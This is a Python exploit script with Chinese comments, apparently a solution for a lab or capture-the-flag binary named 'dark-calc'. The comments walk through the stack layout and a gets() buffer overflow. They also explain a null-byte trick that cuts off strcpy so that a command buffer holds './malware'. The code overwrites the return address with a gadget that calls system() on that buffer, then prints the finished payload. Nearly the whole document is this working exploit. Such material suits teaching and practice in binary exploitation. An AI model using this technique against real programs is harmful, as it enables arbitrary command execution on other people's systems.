import sys

# ============================ 攻击原理 ============================
# dark-calc 的 input() 里：
#     char expression[16];
#     gets(expression);            // 无长度检查，经典栈溢出
#     strcpy(command_buf, expression);
#
# 栈布局（input 的帧，sub rsp,0x10）：
#     [rbp-0x10] expression[16]
#     [rbp+0x00] saved rbp
#     [rbp+0x08] 返回地址
#
# 单纯把返回地址改成 malware 没用，因为 malware 是独立脚本，
# 必须让 dark-calc 自己通过 system() 去执行它。
#
# 好处是 eval() 里本来就有现成的调用点：
#     0x401a6b: mov edi, 0x6030d0   ; rdi = command_buf
#     0x401a70: call system@plt
# 只要把返回地址指到 0x401a6b，就会执行 system(command_buf)。
#
# 难点在于 command_buf 必须恰好是 "./malware"：
# 若直接写满 32 字节溢出，command_buf 会带上一堆垃圾，system 执行失败。
# 解法是用 "\x00" 提前截断：
#     gets 不看 \0，照样把 32 字节全部写进栈；
#     但 strcpy 靠 strlen，遇到 \0 就停，于是 command_buf 只剩 "./malware"。
# 这样既能溢出到返回地址，又能让 command_buf 保持干净。
# =================================================================

p  = b"./malware\x00"                    # strcpy 在这里被截断
p += b"A" * (16 - len(p))                # 填满 16 字节 expression
p += b"B" * 8                            # 覆盖 saved rbp（leave 后不再用）
p += (0x401A6B).to_bytes(8, "little")    # 返回地址 -> mov edi,command_buf; call system
p += b"\n"

sys.stdout.buffer.write(p)
